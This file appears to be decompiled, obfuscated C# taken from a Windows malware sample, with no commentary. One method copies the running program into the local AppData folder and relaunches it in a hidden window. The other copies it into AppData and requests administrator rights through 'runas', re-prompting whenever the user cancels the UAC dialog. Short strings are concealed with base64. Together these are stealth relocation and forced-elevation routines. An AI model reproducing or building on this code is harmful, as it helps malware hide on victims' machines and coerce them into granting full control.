using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ns0;

internal class Class1
{
	public static void smethod_0()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Encoding.UTF8.GetString(Convert.FromBase64String("XA==")) + GClass2.string_5;
		File.Copy(Application.get_ExecutablePath(), text);
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = text,
			Arguments = Encoding.UTF8.GetString(Convert.FromBase64String("L2E=")),
			WindowStyle = ProcessWindowStyle.Hidden,
			WorkingDirectory = Path.GetDirectoryName(text)
		};
		process.Start();
		Environment.Exit(0);
	}

	public static void smethod_1(string string_0)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Encoding.UTF8.GetString(Convert.FromBase64String("XA=="));
		string text2 = text + string_0;
		ProcessStartInfo startInfo = new ProcessStartInfo(text2)
		{
			UseShellExecute = true,
			Verb = Encoding.UTF8.GetString(Convert.FromBase64String("cnVuYXM=")),
			WindowStyle = ProcessWindowStyle.Normal,
			WorkingDirectory = text,
			Arguments = Encoding.UTF8.GetString(Convert.FromBase64String("L3g="))
		};
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != string_0) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					smethod_1(string_0);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				smethod_1(string_0);
			}
		}
	}
}
